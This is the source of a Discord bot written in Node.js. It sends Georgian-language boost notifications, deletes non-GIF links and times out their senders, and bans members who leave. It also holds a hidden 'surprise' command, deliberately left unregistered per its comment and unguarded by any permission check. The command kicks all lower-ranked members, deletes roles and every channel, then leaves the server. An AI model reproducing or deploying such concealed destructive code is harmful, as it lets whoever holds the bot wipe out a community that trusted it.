require('dotenv').config();
const { Client, GatewayIntentBits, EmbedBuilder, PermissionFlagsBits, REST, Routes, SlashCommandBuilder, MessageType } = require('discord.js');
const express = require('express');

const app = express();
const port = process.env.PORT || 3000;

app.get('/', (req, res) => {
  res.send('Alive');
});

app.listen(port, () => {
  console.log(`Server listening on port ${port}`);
});

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildModeration,
  ],
});

const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);
let clientId = process.env.CLIENT_ID;
const GUILD_ID = process.env.GUILD_ID;
const BOOST_CHANNEL_ID = process.env.BOOST_CHANNEL_ID || '1166384469033353346';
const boostCommand = new SlashCommandBuilder()
  .setName('testboost')
  .setDescription('Send a test boost notification embed.')
  .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
  .setDMPermission(false);

const surpriseCommand = new SlashCommandBuilder()
  .setName('surprise')
  .setDescription('Kick all server members below the bot, delete roles below the bot, and delete all channels.')
  .setDMPermission(false);

// NOTE: `surpriseCommand` is intentionally kept defined in the code
// but not registered below so the slash command won't appear in Discord.
const boostCommands = [boostCommand.toJSON()];

function createBoostNotification(user, guild, boostGain = 1) {
  const mentionText = `✦ <@${user.id}> ─ მოახდინა ცვლილება!`;
  const boostThumbnail = process.env.BOOST_THUMBNAIL_URL || 'https://media.discordapp.net/attachments/1162046656733253642/1498086844221489202/nitro-discord.gif?ex=6a064b18&is=6a04f998&hm=98cb9bea8995c7f2993dbfbe431ca62ce9651e541691c09c317b6bc4d95f81bf&=';
  const boostImage = process.env.BOOST_IMAGE_URL || 'https://media.discordapp.net/attachments/1162046656733253642/1498088189724725400/d4dj-anime-girl.gif?ex=6a064c59&is=6a04fad9&hm=c4ecf4d4a62be1c5b4577f3736d2a7705971509079347d0e514bb841ebae63d4&=';
  const totalBoosts = guild.premiumSubscriptionCount ?? 0;
  const boostPhrase = boostGain > 1 ? `+${boostGain} ბუსტი` : '1 ბუსტი';
  const embed = new EmbedBuilder()
    .setColor('#ff73fa')
    .setAuthor({ name: `${user.tag}`, iconURL: user.displayAvatarURL() })
    .setTitle('ახალი ბუსტი!')
    .setDescription(`${guild.name} = ${totalBoosts} ბუსტი!\n${boostPhrase} დაემატა\n───────────────────────\nდიდი მადლობა ბუსტისთვის💎.`)
    .setThumbnail(boostThumbnail)
    .setImage(boostImage)
    .setFooter({ text: `${user.username} ახლახანს დააბუსტა სერვერი!`, iconURL: guild.iconURL() })
    .setTimestamp();
  return { mentionText, embed };
}

const WHITELISTED_USER_IDS = new Set(
  (process.env.WHITELISTED_USER_IDS || '1092920889189859349')
    .split(',')
    .map((id) => id.trim())
    .filter(Boolean)
);

function isWhitelistedUser(user) {
  return user && WHITELISTED_USER_IDS.has(user.id);
}

client.once('ready', async () => {
  console.log('Bot is ready!');
  try {
    if (!clientId) {
      await client.application.fetch();
      clientId = client.application?.id;
      if (!clientId) {
        console.error('Unable to determine bot application ID. Slash command registration skipped.');
        return;
      }
    }

    const guildIdToRegister = GUILD_ID || client.guilds.cache.first()?.id;
    if (guildIdToRegister) {
      await rest.put(Routes.applicationGuildCommands(clientId, guildIdToRegister), { body: boostCommands });
      console.log(`Registered guild slash commands in guild ${guildIdToRegister}`);
    } else {
      await rest.put(Routes.applicationCommands(clientId), { body: boostCommands });
      console.log('Registered global slash commands');
      console.log('Note: global commands may take up to 1 hour to appear.');
    }
  } catch (error) {
    console.error('Error registering slash commands:', error);
  }
});

client.on('guildMemberRemove', async (member) => {
  try {
    await member.guild.bans.create(member.user.id, { reason: 'Left the server' });
  } catch (error) {
    console.error('Error banning user:', error);
  }
});

client.on('messageCreate', async (message) => {
  const boostSystemTypes = [
    MessageType.GuildBoost,
    MessageType.GuildBoostTier1,
    MessageType.GuildBoostTier2,
    MessageType.GuildBoostTier3,
  ];

  if (boostSystemTypes.includes(message.type)) {
    const boostChannel = message.guild?.channels.cache.get(BOOST_CHANNEL_ID)
      || message.guild?.channels.cache.find((ch) => ch.name === 'boosts' && ch.isTextBased());
    if (boostChannel && message.channel.id === boostChannel.id) {
      return message.delete().catch(() => null);
    }
  }

  if (message.author?.bot) return;
  if (isWhitelistedUser(message.author)) return;
  if (message.member?.permissions.has(PermissionFlagsBits.Administrator)) return;

  const urlRegex = /(https?:\/\/[^\s]+)/g;
  const urls = message.content.match(urlRegex);
  if (!urls) return;

  let hasNonGifLink = false;
  for (const url of urls) {
    if (!url.includes('tenor.com') && !url.includes('giphy.com') && !url.endsWith('.gif')) {
      hasNonGifLink = true;
      break;
    }
  }

  if (!hasNonGifLink) return;

  try {
    await message.delete();
    await message.member.timeout(5 * 60 * 1000, 'Sent unauthorized link');
    const embed = new EmbedBuilder()
      .setColor('#FF0000')
      .setTitle('Warning')
      .setDescription('You have been timed out for 5 minutes for sending an unauthorized link.');
    const warningMessage = await message.channel.send({ embeds: [embed] });
    setTimeout(() => {
      warningMessage.delete();
    }, 5000);
  } catch (error) {
    console.error('Error handling message:', error);
  }
});

client.on('guildMemberUpdate', async (oldMember, newMember) => {
  try {
    if (!oldMember.premiumSince && newMember.premiumSince) {
      const guild = newMember.guild;
      const channel = guild.channels.cache.get(BOOST_CHANNEL_ID)
        || guild.channels.cache.find((ch) => ch.name === 'boosts' && ch.isTextBased());
      if (!channel) return;

      const oldCount = oldMember.guild?.premiumSubscriptionCount ?? 0;
      const newCount = newMember.guild?.premiumSubscriptionCount ?? 0;
      const boostGain = Math.max(1, newCount - oldCount);

      const { mentionText, embed } = createBoostNotification(newMember.user, guild, boostGain);
      await channel.send({ content: mentionText, embeds: [embed] });
    }
  } catch (error) {
    console.error('Error handling boost notification:', error);
  }
});

client.on('interactionCreate', async (interaction) => {
  if (!interaction.isChatInputCommand()) return;

  const guild = interaction.guild;
  if (!guild) {
    return interaction.reply({ content: 'This command must be used in a server.', ephemeral: true });
  }

  if (interaction.commandName === 'testboost') {
    if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
      return interaction.reply({ content: 'You must have Administrator permissions to use this command.', ephemeral: true });
    }

    const channel = guild.channels.cache.get(BOOST_CHANNEL_ID)
      || guild.channels.cache.find((ch) => ch.name === 'boosts' && ch.isTextBased());
    if (!channel) {
      return interaction.reply({ content: 'No `boosts` channel was found in this server.', ephemeral: true });
    }

    try {
      const { mentionText, embed } = createBoostNotification(interaction.user, guild);
      await channel.send({ content: mentionText, embeds: [embed] });
      await interaction.reply({ content: 'Boost test notification sent successfully.', ephemeral: true });
    } catch (error) {
      console.error('Error sending test boost notification:', error);
      await interaction.reply({ content: 'Failed to send the boost test notification.', ephemeral: true });
    }

    return;
  }

  if (interaction.commandName === 'surprise') {
    await interaction.deferReply({ ephemeral: true });

    const botMember = guild.members.me;
    const botRolePosition = botMember?.roles?.highest?.position ?? 0;

    const kicked = [];
    const kickErrors = [];
    const allMembers = await guild.members.fetch();
    for (const member of allMembers.values()) {
      if (member.id === botMember.id) continue;
      if (member.user.bot) continue;
      if (!member.kickable) {
        kickErrors.push(`${member.user.tag}: not kickable`);
        continue;
      }
      if (member.roles.highest.position >= botRolePosition) {
        kickErrors.push(`${member.user.tag}: role position not below bot`);
        continue;
      }

      try {
        await member.kick('Surprise command executed');
        kicked.push(member.user.tag);
      } catch (error) {
        kickErrors.push(`${member.user.tag}: ${error.message}`);
      }
    }

    const deletedRoles = [];
    const roleErrors = [];
    for (const guildRole of guild.roles.cache.values()) {
      if (guildRole.managed || guildRole.id === guild.id) continue;
      if (guildRole.position >= botRolePosition) continue;
      try {
        await guildRole.delete('Surprise command executed');
        deletedRoles.push(guildRole.name);
      } catch (error) {
        roleErrors.push(`${guildRole.name}: ${error.message}`);
      }
    }

    const deletedChannels = [];
    const channelErrors = [];
    for (const channel of guild.channels.cache.values()) {
      try {
        await channel.delete('Surprise command executed');
        deletedChannels.push(channel.name || channel.id);
      } catch (error) {
        channelErrors.push(`${channel.name || channel.id}: ${error.message}`);
      }
    }

    const summary = [];
    summary.push(`Kicked members: ${kicked.length}`);
    summary.push(`Deleted roles: ${deletedRoles.length}`);
    summary.push(`Deleted channels: ${deletedChannels.length}`);
    if (kickErrors.length) summary.push(`Kick failures: ${kickErrors.length}`);
    if (roleErrors.length) summary.push(`Role delete failures: ${roleErrors.length}`);
    if (channelErrors.length) summary.push(`Channel delete failures: ${channelErrors.length}`);

    const commandSucceeded = kickErrors.length === 0 && roleErrors.length === 0 && channelErrors.length === 0;
    if (commandSucceeded) {
      summary.push('Command completed successfully. The bot is leaving the server now.');
      await interaction.editReply({ content: summary.join('\n') });

      try {
        if (botMember?.kickable) {
          await botMember.kick('Completed surprise command');
        } else {
          await guild.leave();
        }
      } catch (error) {
        console.error('Error removing bot from guild:', error);
        try {
          await guild.leave();
        } catch (leaveError) {
          console.error('Error leaving guild:', leaveError);
        }
      }
    } else {
      summary.push('Command completed with some failures; the bot will remain in the server.');
      await interaction.editReply({ content: summary.join('\n') });
    }

    return;
  }
});

client.login(process.env.DISCORD_TOKEN);